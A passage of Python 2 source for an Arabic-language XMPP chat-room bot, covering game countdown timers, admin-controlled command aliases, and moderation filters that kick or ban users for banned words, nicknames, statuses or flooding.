  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==11 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==11 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==11 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==11 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	 
   msg(g,n, Game_Time_out_R[9])  
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))    
   del START1[n]  
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass   
   
def natoxty11(g,n,u,p):
 try:	
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==12 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==12 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==12 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==12 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==12 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==12:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	 
   msg(g,n, Game_Time_out_R[10])  
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))    
   del START1[n]   
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass   
   
def natoxty12(g,n,u,p):
 try:	
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==13 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==13 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==13 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==13 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==13 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==13 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	 
   msg(g,n, Game_Time_out_R[11])    
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))   
   del START1[n]   
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass   
   
def natoxty13(g,n,u,p):
 try:	
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==14 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==14 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==14 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==14 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==14 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==14 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	 
   msg(g,n, Game_Time_out_R[12])    
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))  
   del START1[n]  
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass   
   
def natoxty14(g,n,u,p):
 try:	
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==15 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==15 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==15 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==15 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==15 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==15 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	 
   msg(g,n, Game_Time_out_R[13])  
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))  
   del START1[n]   
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass   
   
def natoxty15(g,n,u,p):
 try:	
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==16 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==16 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==16 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==16 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==16 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==16 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	 
   msg(g,n, Game_Time_out_R[14])  
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))  
   del START1[n] 
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass
 
AUto_stop_game = AUTO_STOP_GAME

def stop_game_auto1(g,n,u,p):
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==1 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass
	
def stop_game_auto2(g,n,u,p):	
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==2 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass
	
def stop_game_auto3(g,n,u,p):	
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==3 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass
	
def stop_game_auto4(g,n,u,p):	
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==4 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass
	
def stop_game_auto5(g,n,u,p):	
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==5 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass
	
def stop_game_auto6(g,n,u,p):	
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==6 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass
	
def stop_game_auto7(g,n,u,p):	
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==7 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass
	
def stop_game_auto8(g,n,u,p):
 try:	
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==8 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass	
	
def stop_game_auto9(g,n,u,p):	
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==9 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass	
	
def stop_game_auto10(g,n,u,p):	
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==10 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass
	
def stop_game_auto11(g,n,u,p):	
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==11 and n in START1:
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass
	
def stop_game_auto12(g,n,u,p):	
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==12 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass
	
def stop_game_auto13(g,n,u,p):	
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==13 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass	
	
def stop_game_auto14(g,n,u,p):	
 try:
  time.sleep(AUTO_STOP_GAME_TIME)
  if Melody_Game['melody'][n][u]['c']==14 and n in START1: 
   del START1[n] 
   msg(g,n, AUto_stop_game) 
 except: pass	
	

######################################################
######################################################
# امر الاختصارات

def hnd_melody_alias(t, s, p):
 if not s[1] in GROUPCHATS:
  return
 Wacc=access_level=str(user_level(s[1]+'/'+s[2], s[1]))  
 if not s[1] in MUC_Alias:
        MUC_Alias[s[1]]={} 
 if not p: 
  reply(t, s, s[2]+' : '+XAlias[19]) 		 	 
 else:  
  sx=p.split()
  if sx[0]==XAlias[7]: #show_global
   if Wacc == "100":      
     rep=''
     for x in GMUC_Alias:
      rep+=x+"="
      for c in GMUC_Alias[x].keys():
       rep+=c+"\n"
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XAlias[16]) 
     return	 
   else: reply(t, s, s[2]+' : '+XAlias[20])	  	 
	 
  elif sx[0]==XAlias[3]: #show
     rep=''
     for x in MUC_Alias[s[1]].keys():
      rep+=x+"="
      for c in MUC_Alias[s[1]][x].keys():
       rep+=c+"\n"
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XAlias[16]) 
     return	 
	 
	 
  elif sx[0]==XAlias[6]: #del_global
   if Wacc == "100":    
    sr=p.split()
    if p.count('='): alias=p.split("حذف-عام ".decode('utf8'))[1].split("=")[0]   
    else: alias=sr[1]   
    if alias in GMUC_Alias: 
     del GMUC_Alias[alias]	          
     write_file(GMUC_Alias_FILE, str(GMUC_Alias))
     reply(t, s, s[2]+' : '+XAlias[14])   
    else: reply(t, s, s[2]+' : '+XAlias[15]) 	  
    return	
   else: reply(t, s, s[2]+' : '+XAlias[20])	   
   
  elif sx[0]==XAlias[2]: #del
   sr=p.split()
   if p.count('='): alias=p.split("حذف ".decode('utf8'))[1].split("=")[0]   
   else: alias=sr[1]   
   if alias in MUC_Alias[s[1]].keys(): 
      del MUC_Alias[s[1]][alias]	          
      write_file(MUC_Alias_FILE, str(MUC_Alias))
      reply(t, s, s[2]+' : '+XAlias[14])   
   else: reply(t, s, s[2]+' : '+XAlias[15]) 	  
   return	

  elif sx[0]==XAlias[8]: #clear_global
   if Wacc == "100":  	
      write_file(GMUC_Alias_FILE, str('{}'))
      reply(t, s, s[2]+' : '+XAlias[18])
      time.sleep(5)
      p = domish.Element(('jabber:client', 'presence'))
      p['type'] = 'unavailable'
      p.addElement('status').addContent(u'BoT AuTo ResTarT')
      for x in CLIENTS.keys():
       reactor.callFromThread(dd, p, CLIENTS[x])
      reactor.stop()
      time.sleep(2)
      os.execl(sys.executable, sys.executable, sys.argv[0])      
      return
   else: reply(t, s, s[2]+' : '+XAlias[20])	
  elif sx[0]==XAlias[4]: #clear	
   del MUC_Alias[s[1]]
   write_file(MUC_Alias_FILE, str(MUC_Alias))
   reply(t, s, s[2]+' : '+XAlias[17])
   return   

   
  elif sx[0]==XAlias[5]:   #add_global
   if Wacc == "100":   
    if not p.count('='): reply(t, s, s[2]+' : '+XAlias[9])
    else:  
     alias=p.split("اضافة-عامة ".decode('utf8'))[1].split("=")[0] 
     commandsx=p.split("=")[1].split()[0]  
     new_commands=p.split("=")[1]     
     if commandsx in COMMAND1S:
      acc=COMMAND1S[commandsx]['access']
      if Wacc == "100":
       if not alias in GMUC_Alias:	 
        GMUC_Alias[alias]={}      
        GMUC_Alias[alias][new_commands]={}    
        write_file(GMUC_Alias_FILE, str(GMUC_Alias))
        reply(t, s, s[2]+' : '+XAlias[10])
       else:	
        del GMUC_Alias[alias]	 
        GMUC_Alias[alias]={}      
        GMUC_Alias[alias][new_commands]={}    
        write_file(GMUC_Alias_FILE, str(GMUC_Alias))
        reply(t, s, s[2]+' : '+XAlias[11])	  
      else: reply(t, s, s[2]+' : '+XAlias[12])   
     else: reply(t, s, s[2]+' : '+XAlias[13])
   else: reply(t, s, s[2]+' : '+XAlias[20]) 
	
  elif sx[0]==XAlias[1]:   
   if not p.count('='): reply(t, source, source[2]+' : '+XAlias[9])#add
   else:  
    alias=p.split("اضافة ".decode('utf8'))[1].split("=")[0] 
    commandsx=p.split("=")[1].split()[0]  
    new_commands=p.split("=")[1]   
    if commandsx in COMMAND1S:
     acc=COMMAND1S[commandsx]['access']
     if Wacc == "100":
      if not alias in MUC_Alias[s[1]].keys():	 
       MUC_Alias[s[1]][alias]={}      
       MUC_Alias[s[1]][alias][new_commands]={}    
       write_file(MUC_Alias_FILE, str(MUC_Alias))
       reply(t, s, s[2]+' : '+XAlias[10])
      else:	
       del MUC_Alias[s[1]][alias]	 
       MUC_Alias[s[1]][alias]={}      
       MUC_Alias[s[1]][alias][new_commands]={}    
       write_file(MUC_Alias_FILE, str(MUC_Alias))
       reply(t, s, s[2]+' : '+XAlias[11])	  
     else: reply(t, s, s[2]+' : '+XAlias[12])   
    else: reply(t, s, s[2]+' : '+XAlias[13])   

	
  else: reply(t, s, s[2]+' : '+XAlias[19]) 		
register(hnd_melody_alias, XAlias[0], 30)	



def hnd_alias(r, t, s, p):     
    if not p: return
    if s[2]==get_bot_nick(s[1]): return	   
    if not s[1] in MUC_Alias:
        MUC_Alias[s[1]]={} 
    sp=p.split()			
    room = [s[1]+'/'+s[2], s[1], s[2], s[3]]	
    try: 	
     if sp[0] in MUC_Alias[s[1]].keys():  	
      MSG="".join(MUC_Alias[s[1]][sp[0]].keys())	
      commands=MSG.split(' ')[0]		 
      s5=MSG.split(commands)[1]	
      try: s8=MSG.split(' ')[1]	
      except: s8="" 		 
      if "%*" not in s5: 
         call_command_2handlere(commands, t, room,s8) 	 
      else:	 
       if "%*" in s5 and " " in p:	 
        if "%*" in s5 and commands =="acl":
         if "*" in s5:	 
            s6=s5.replace("%*",sp[1])			
            call_command_2handlere(commands, t, room,s6)			
         else: 
          s6=s5.replace("%*",sp[1]+" *") 
          call_command_2handlere(commands, t, room,s6)		 
        elif "%*" in s5 :
            s6=s5.replace("%*",sp[1])				
            call_command_2handlere(commands, t, room,s6)			
       else: 
        msg(s[3],s[1],XAlias[21])
     else: pass
    except: pass		
	
    try: 	
     if sp[0] in GMUC_Alias: 	
      MSG1="".join(GMUC_Alias[sp[0]].keys())	
      commands=MSG1.split(' ')[0]		 
      g5=MSG1.split(commands)[1]	
      try: g8=MSG1.split(' ')[1]	
      except: g8="" 		 
      if "%*" not in g5: 
         call_command_2handlere(commands, t, room,g8) 	 
      else:	 
       if "%*" in g5 and " " in p:	 
        if "%*" in g5 and commands =="acl":
         if "*" in g5:	 
            g6=g5.replace("%*",sp[1])			
            call_command_2handlere(commands, t, room,g6)			
         else: 
          g6=g5.replace("%*",sp[1]+" *")	 
          call_command_2handlere(commands, t, room,g6)		 
        elif "%*" in g5 :
            g6=g5.replace("%*",sp[1])			
            call_command_2handlere(commands, t, room,g6)			
       else: 
        msg(s[3],s[1],XAlias[21])
     else: pass
    except: pass	 
register_message_handler(hnd_alias)

######################################################
######################################################
#ارتباطات فلترة
def nawrsx1(body,groupchat):
        global smart
        if not groupchat in smart or not smart[groupchat].keys():
                return
        for i in Smail:
         if i in body:
          body=body.replace(i,"") 		
        for y in rmoz:
         if y in body:
          body=body.replace(y,"")  	
        body=body.lower()  		
        for x in smart[groupchat].keys():
                if x in body:
                        return True
        return False
def nawrs1(body,chat):
        global Gsmart
        for i in Smail:
         if i in body:
          body=body.replace(i,"") 		
        for y in rmoz:
         if y in body:
          body=body.replace(y,"")  	
        body=body.lower() 
        for x in Gsmart:
                if x in body:
                        return True
        return False

def nawrsx2(body,groupchat):
        global BADall
        if not groupchat in BADall or not BADall[groupchat].keys():
                return
        for i in Smail:
         if i in body:
          body=body.replace(i,"") 		
        for y in rmoz:
         if y in body:
          body=body.replace(y,"")  	
        body=body.lower() 
        for x in BADall[groupchat].keys():
                if x in body:
                        return True
        return False
def nawrs2(body,chat):
        global GBADall
        for i in Smail:
         if i in body:
          body=body.replace(i,"") 		
        for y in rmoz:
         if y in body:
          body=body.replace(y,"")  	
        body=body.lower()    
        for x in GBADall:
                if x in body:
                        return True
        return False	
def hnd_filter_msg11(r, t, s, p):
    global msgx        
    if not p: return
    if s[2]==get_bot_nick(s[1]): return
    if not s[1] in msgx:
        msgx[s[1]]={}        
    jid = get_true_jid(s)
    if p in msgx[s[1]].keys():
        msg(s[3],s[1],"".join(msgx[s[1]][p]["قول".decode('utf8')].keys()))    
    if p in Gmsgx:
        msg(s[3],s[1],"".join(Gmsgx[p]["قول".decode('utf8')].keys()))    		
register_message_handler(hnd_filter_msg11)

def hnd_filter_msg1(r, t, s, p):
    global smart
    global BADall    
    if not p: return
    if s[2]==get_bot_nick(s[1]): return
    if not s[1] in smart:
        smart[s[1]]={}
    if not s[1] in BADall:
        BADall[s[1]]={}        
    jid = get_true_jid(s)  
    s2 = [s[1]+'/'+s[2], s[1], s[2], s[3]]
    if t in "chat":	
     if len(p) >BAD_MSG_BOT:
      if "طرد".decode('utf8') in Tolls_BOT:
       filter_melody1 (s, natox7x7, 'role', 'none') 	 
      elif "فصل".decode('utf8') in Tolls_BOT:
       filter_melody1 (s, natox7x7, 'affiliation', 'outcast') 	 
      else: pass   	
    if nawrsx1(p, s[1]):
        for i in Smail:
         if i in p:
          p=p.replace(i,"") 		
        for y in rmoz:
         if y in p:
          p=p.replace(y,"")  	
        p=p.lower()   
        for x in smart[s[1]].keys():
                  if x in p:                        
                        if "طرد".decode('utf8') in smart[s[1]][x].keys() :
                                filter_melody1 (s, "".join(smart[s[1]][x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        else: pass        
                        if "فصل".decode('utf8') in smart[s[1]][x].keys() :
                                filter_melody1 (s, "".join(smart[s[1]][x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')
                        else: pass 	 
						
    if nawrs1(p, s[1]):
        for i in Smail:
         if i in p:
          p=p.replace(i,"") 		
        for y in rmoz:
         if y in p:
          p=p.replace(y,"")  	
        p=p.lower()                              
        for x in Gsmart:
                if x in p:
                        if "طرد".decode('utf8') in Gsmart[x].keys() :
                                filter_melody1 (s, "".join(Gsmart[x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        else: pass        
                        if "فصل".decode('utf8') in Gsmart[x].keys() :
                                filter_melody1 (s, "".join(Gsmart[x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')
                        else: pass    

##
    if nawrsx2(p, s[1]):
        for i in Smail:
         if i in p:
          p=p.replace(i,"") 		
        for y in rmoz:
         if y in p:
          p=p.replace(y,"")  	
        p=p.lower()    
        for x in BADall[s[1]].keys():
                  if x in p:                        
                        if "طرد".decode('utf8') in BADall[s[1]][x].keys() :
                                filter_melody1 (s, "".join(BADall[s[1]][x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        else: pass        
                        if "فصل".decode('utf8') in BADall[s[1]][x].keys() :
                                filter_melody1 (s, "".join(BADall[s[1]][x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')
                        else: pass 	 
						
    if nawrs2(p, s[1]):
        for i in Smail:
         if i in p:
          p=p.replace(i,"") 		
        for y in rmoz:
         if y in p:
          p=p.replace(y,"")  	
        p=p.lower()           
        for x in GBADall:
                if x in p:
                        if "طرد".decode('utf8') in GBADall[x].keys() :
                                filter_melody1 (s, "".join(GBADall[x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        else: pass        
                        if "فصل".decode('utf8') in GBADall[x].keys() :
                                filter_melody1 (s, "".join(GBADall[x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')
                        else: pass    
##
 
register_message_handler(hnd_filter_msg1)


######################################################
######################################################
# -*- coding: utf-8 -*-
MCF_NS = 'http://jabber.ru/muc-filter'
Filter2 = True
Filter3 = True
Filter4 = True
Filter6 = True

MUC_FILT = {'fastjoin':{},'pvlock':{}}

import random	
zrange = range(35000, 40000)
def badchina(china):
        for char in china:
                try:
                        num = ord(char)
                        if num in zrange:
                                return True
                except:
                        continue
        return False
#ok
def checkres(data):
 for x in RES_BAD:
  if x in data:
   return True
 return False
def Nick_Sp2(nick):
        nick=nick.lower()
        nick=u' '+nick+u' '
        for x in NICK_BAD:
                if nick.count(x):
                        return True
        return False
def Nick_Sp1(resource):
        resource=resource.lower()
        resource=u' '+resource+u' '
        for x in RES_BAD:
                if resource.count(x):
                        return True
        return False

def order_words(body):
        body=body.lower()
        body=u' '+body+u' '
        for x in MSG_BAD2:
                if body.count(x):
                        return True
        return False

def order_56ords(body):
        body=body.lower()
        body=u' '+body+u' '
        for x in ADB:
                if body.count(x):
                        return True
        return False
def Status_Sp2(status):
        status=status.lower()
        status=u' '+status+u' '
        for x in Status_BAD:
                if status.count(x):
                        return True
        return False
def Status_room(status):
        status=status.lower()
        status=u' '+status+u' '
        for x in ADB:
                if status.count(x):
                        return True
        return False
def Nick_room(nick):
        nick=nick.lower()
        nick=u' '+nick+u' '
        for x in ADB:
                if nick.count(x):
                        return True
        return False
def hackbot1(body1, body2):
        try:
                if body1.split(":"):
                        data1 = body1.split(":")[1]
                if body2.split(":"):
                        data2 = body2.split(":")[1]
                if data1 == data2:
                        return True
                return False
        except: pass
def hackbot11(body1, body2):
        try:
                if body1.split(":"):
                        data1 = body1.split(":")[1]
                if body2.split(":"):
                        data2 = body2.split(":")[1]
                if data1 != data2:
                        return True
                return False
        except: pass
def checkjid1(data, groupchat):
        file='rooms-data/'+groupchat+'/users.py'
        if check_file(groupchat,'users.py'):
                try:
                        Users5 = eval(read_file(file))
                except: pass                
        if not groupchat in Black1 or not "on" in Black1[groupchat].keys():
                return		
        for x in Users5:
                if x in data:
                        return False
        return True	

def SameChar(data):
 if [x for x in data if unicodedata.category(x)=='Lo']:		
  try:
   if data not in AllowMsg:          
    if data[0]==data[1] or data[1]==data[2]or data[2]==data[3]or data[3]==data[4]or data[4]==data[5]or data[5]==data[6]or data[6]==data[7]or data[7]==data[8]or data[8]==data[9]or data[9]==data[10]or data[10]==data[11]or data[11]==data[12]or data[12]==data[13]or data[13]==data[14]or data[14]==data[15]or data[15]==data[16]or data[16]==data[17]or data[17]==data[18]or data[18]==data[19]or data[19]==data[20]or data[20]==data[21]or data[21]==data[22]or data[22]==data[23]or data[23]==data[24]or data[24]==data[25]or data[25]==data[26]or data[26]==data[27]or data[27]==data[28]or data[28]==data[29]or data[29]==data[30]or data[30]==data[31]or data[31]==data[32]or data[32]==data[33]or data[33]==data[34]or data[34]==data[35]:        
     return True				
    else: pass
  except: return False

def SmartCensor5(data):
 global CENSORX
 for i in Smail:
   if i in data:
    data=data.replace(i,"") 		
 for y in rmoz:
  if y in data:
   data=data.replace(y,"") 		
 data=data.lower()                         
 data=u' '+data+u' '
 for x in CENSORX:
  if x in data:
   return True
 return False
def capslist(data):
        for x in DABCAPS:
                if data.count(x):
                        return True
        return False	

nobadverx = ['http://syriatalk.info/caps',
             'http://syriatalk.biz/caps',
             'http://melodytalk.org/caps',	
             'http://zngar.com/caps',				 
             'http://syriatalk.org/caps',
             'http://syriatalk.us/caps',
             'http://matrixteam.org/caps',
             'http://jsmart.web.id/caps',
             'http://emoje.org/caps',
             'http://syriamoon.org/caps',
             'http://starstalk.net/caps',
             'http://sawim.ru/caps']

def checkall(data, groupchat):
 global BADall
 if not groupchat in BADall or not BADall[groupchat].keys():
  return
 for i in Smail:
   if i in data:
    data=data.replace(i,"") 		
 for y in rmoz:
  if y in data:
   data=data.replace(y,"") 		
 data=data.lower()
 for x in BADall[groupchat].keys():
  if x in data:
   if "حجب".decode('utf8') in BADall[groupchat][x].keys() :
    return True
 return False
def Gcheckall(data):
 global GBADall
 for i in Smail:
   if i in data:
    data=data.replace(i,"") 		
 for y in rmoz:
  if y in data:
   data=data.replace(y,"") 		
 data=data.lower()
 for x in GBADall:
  if x in data:
   if "حجب".decode('utf8') in GBADall[x].keys() :
    return True
 return False
def nawrs(body):
 global Gsmart
 for i in Smail:
   if i in body:
    body=body.replace(i,"") 		
 for y in rmoz:
  if y in body:
   body=body.replace(y,"") 
 body=body.lower()
 for x in Gsmart:
  if x in body:
   if "حجب".decode('utf8') in Gsmart[x].keys() :
    return True
 return False
def nawrsx(body,groupchat):
 global smart
 if not groupchat in smart or not smart[groupchat].keys():
  return 
 for i in Smail:
   if i in body:
    body=body.replace(i,"") 		
 for y in rmoz:
  if y in body:
   body=body.replace(y,"")  
 body=body.lower() 
 for x in smart[groupchat].keys():
  if x in body:
   if "حجب".decode('utf8') in smart[groupchat][x].keys() :
    return True
 return False
def Nick_nawrsx(nick):
 global GBADNICK   
 for y in rmoz:
  if y in nick:
   nick=nick.replace(y,"")  
 nick=nick.lower()
 for x in GBADNICK:
  if x in nick:
   if "حجب".decode('utf8') in GBADNICK[x].keys() :
    return True
 return False
def Nick_nawrs(nick,groupchat):
 global BADNICK
 if not groupchat in BADNICK or not BADNICK[groupchat].keys():
  return        
 for y in rmoz:
  if y in nick:
   nick=nick.replace(y,"")  
 nick=nick.lower() 
 for x in BADNICK[groupchat].keys():
  if x in nick:
   if "حجب".decode('utf8') in BADNICK[groupchat][x].keys() :
    return True
 return False
def status_nawrs(status,groupchat):
        global BANST
        if not groupchat in BANST or not BANST[groupchat].keys():
                return        
        for x in BANST[groupchat].keys():
                if x in status:
                        if "حجب".decode('utf8') in BANST[groupchat][x].keys() :
                             return True
        return False
def status_nawrsx(status):       
        for x in GBANST:
                if x in status:
                        if "حجب".decode('utf8') in GBANST[x].keys() :
                             return True
        return False
		

def MUC_ARABIC(body,chat):
 for z in GROUPCHATS[chat].keys():
  if z in body:
   if z+":" in body:
    body=body.replace(z+":","") 
   elif z+"," in body:
    body=body.replace(z+",","") 
   elif z in body:
    body=body.replace(z,"")	
 for i in Smail:
  if i in body:
   body=body.replace(i,"") 
 p=body.lower()
 for x in p:
  if x not in Arabic and x not in English: 	 
   return True
 return False
 
FILTER_USER = {}
MUC_FILT3 = {}
MUC_FILT4 = {'rd':{},'msg':{},'allow':{}}
MUC_PV = {}
MUC_PV2 = {'rd':{},'msg':{},'allow':{}}
 
######################################################
######################################################
def msgx2x(m, text,type):
    body = None
    for x in m.elements():
        if x.name == 'body':
            try: body = x.__str__()
            except: pass
    if type == "chat":
     mfrom = m['to']
    elif type == "groupchat":
     mfrom = "%s/%s" %(m['to'].split('/',1)[0],XYouRName[0])

    ms = domish.Element(('jabber:client','message'))
    ms['to'] = m['from']
    ms['from'] = mfrom
    ms['type'] = type
    ms.addElement("body", "jabber:client", text.decode('utf8'))
    return ms
	
def xs_001(m, msg):
        i = domish.Element(('jabber:client', 'presence'))
        i['type'] = 'error'
        i['to']= m['from']
        i['from']=m['to']
        i['xml:lang'] = 'en'
        i.addElement('x', 'http://jabber.org/protocol/muc')
        err = i.addElement('error')
        err['code']= XFiltMSG[66]
        err['type']='auth'
        err.addElement('forbidden','urn:ietf:params:xml:ns:xmpp-stanzas')
        err.addElement('text','urn:ietf:params:xml:ns:xmpp-stanzas').addContent(msg.decode('utf8'))
        return i
		
def xs_003(m,vv1):
        i = domish.Element(('jabber:client', 'presence'))  	
        gg= vv1			
        vv = '%s/%s'%(m['to'].split('/',1)[0],gg)	
        i['to']= vv
        i['from']=m['from']	
        return i  
		
def xs_002(m,text):
        status = ' '     
        i = domish.Element(('jabber:client', 'presence'))
        #i['type'] = i['type']
        i['to']= m['to']
        i['from']=m['from']
        #i.addElement('x', 'http://jabber.org/protocol/muc')
        i.addElement('status', 'jabber:client', text)
        i.addElement('show', 'jabber:client', 'dnd')
        return i
		

FAST_filter_speedx = {}
FAST_filter_speed1 = {}	
FAST_filter_speed2 = {}	
FAST_filter_speed3 = {}	
FAST_filter_speed4 = {}	
	
def filter_xs_003_start(m, text,type,query,iq,chat,jid,xs,cljid):
	
 if not jid in FAST_filter_speed3:
  FAST_filter_speed3[jid]={'time':0,'len':0} 
 if FAST_filter_speed3[jid]['len']>=3: 
  ban1(cljid, chat, " زيادة في تخطي الفلاتر ", jid)    
  FAST_filter_speed3[jid]['time']=time.time() 
  FAST_filter_speed3[jid]['len']=0  
 elif time.time()- FAST_filter_speed3[jid]['time']<=10:
  FAST_filter_speed3[jid]['len']+=1  
  return
 else: 
  i = xs_003(m, text)
  query.addRawXml(i.toXml())
  reactor.callFromThread(iq.send, xs['from'],)
  FAST_filter_speed3[jid]['time']=time.time() 
  FAST_filter_speed3[jid]['len']=0    	
  return
 
	
def filter_xs_002_start(m, text,type,query,iq,chat,jid,xs,cljid):

 if not jid in FAST_filter_speed4:
  FAST_filter_speed4[jid]={'time':0,'len':0} 
 if FAST_filter_speed4[jid]['len']>=3: 
  ban1(cljid, chat, " زيادة في تخطي الفلاتر ", jid)    
  FAST_filter_speed4[jid]['time']=time.time() 
  FAST_filter_speed4[jid]['len']=0  
 elif time.time()- FAST_filter_speed4[jid]['time']<=10:
  FAST_filter_speed4[jid]['len']+=1  
  return
 else: 
  i = xs_002(m, text)
  query.addRawXml(i.toXml())
  reactor.callFromThread(iq.send, xs['from'],)
  FAST_filter_speed4[jid]['time']=time.time() 
